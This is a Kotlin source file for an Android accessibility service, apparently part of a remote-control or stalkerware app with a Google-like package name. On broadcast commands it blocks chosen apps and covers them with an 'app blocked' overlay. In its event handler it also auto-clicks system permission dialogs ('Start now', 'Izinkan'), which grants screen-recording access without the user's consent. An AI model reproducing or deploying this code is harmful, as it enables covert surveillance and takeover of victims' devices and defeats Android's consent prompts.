package com.app.googlemodz

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.FrameLayout
import android.widget.TextView
import android.widget.LinearLayout

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) || 
                svc.equals(componentFull, ignoreCase = true)
            }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.sync.xxx.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                }
                "com.sync.xxx.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                }
                "com.sync.xxx.UNBLOCK_ALL" -> blockedPackages.clear()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 0
        }
        
        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.BLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_ALL")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return

        // --- AUTO KLIK IZIN SCREEN RECORD ---
        if (pkg == "com.android.systemui" || pkg == "android") {
            val root = rootInActiveWindow
            if (root != null) {
                val buttons = root.findAccessibilityNodeInfosByText("Start now")
                    ?: root.findAccessibilityNodeInfosByText("Mulai sekarang")
                    ?: root.findAccessibilityNodeInfosByText("Izinkan")
                
                if (buttons != null) {
                    for (btn in buttons) {
                        if (btn.isClickable) {
                            btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            break
                        }
                    }
                }
            }
            return
        }

        // --- BLOKIR APP ---
        if (pkg == packageName) return
        if (!blockedPackages.contains(pkg)) return

        val now = System.currentTimeMillis()
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime = now

        performGlobalAction(GLOBAL_ACTION_HOME)
        mainHandler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 50)

        showPopupBlokir()
    }

    private fun showPopupBlokir() {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setBackgroundColor(Color.parseColor("#0a0a0f"))
        layout.gravity = Gravity.CENTER
        layout.setPadding(50, 50, 50, 50)

        val title = TextView(this)
        title.text = "APK INI TELAH DIBLOKIR!"
        title.setTextColor(Color.RED)
        title.textSize = 20f
        title.gravity = Gravity.CENTER
        layout.addView(title)

        val sub = TextView(this)
        sub.text = "Anda tidak dapat membuka aplikasi ini."
        sub.setTextColor(Color.WHITE)
        sub.textSize = 14f
        sub.gravity = Gravity.CENTER
        sub.setPadding(0, 20, 0, 0)
        layout.addView(sub)

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.CENTER

        val container = FrameLayout(this)
        val lp = FrameLayout.LayoutParams(500, FrameLayout.LayoutParams.WRAP_CONTENT)
        container.addView(layout, lp)

        wm.addView(container, params)

        // Hapus popup setelah 2.5 detik
        mainHandler.postDelayed({
            try { wm.removeView(container) } catch (e: Exception) {}
        }, 2500)
    }

    override fun onInterrupt() {}
    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}
